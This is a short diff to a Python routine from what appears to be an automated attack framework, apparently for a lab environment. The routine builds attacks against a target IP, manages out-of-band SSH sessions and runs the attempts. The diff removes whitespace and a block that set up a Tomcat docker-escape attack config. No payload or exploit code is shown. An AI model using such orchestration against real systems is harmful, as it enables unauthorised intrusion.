@@ -99,28 +99,13 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                 print(f"{C.COL_RED}[-] Special attack smtp_server cannot be done on this machine, skipping... {C.COL_RESET}")
                 continue
             
-            
 
             attack_obj= attack_db.create_attack(ra, target_ip, attacker_ip, LPORT)
-           
+
 
             if(type(attack_obj)==SshAttack and OOBSession==None):
                 print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
                 continue
-
-            if(attack_name=="tomcat_server"):
-                config_tomcat_file = "../stack/data/attacker/custom_attacks/docker_escape/config_rc.json"
-                with open(config_tomcat_file, 'r') as x:
-                    content = json.load(x)
-                    print(content)
-                    content["TOMCATHOST_201914271"]=target_ip
-                    content["LPORT"]=LPORT
-                with open(config_tomcat_file,'w') as x:
-                    json.dump(content, x, indent=4)
-                with open(config_tomcat_file, 'r') as x:
-                    content = json.load(x)
-                    print(content)
-
                     
 
             session=mc.attempt_attack(attack_obj)
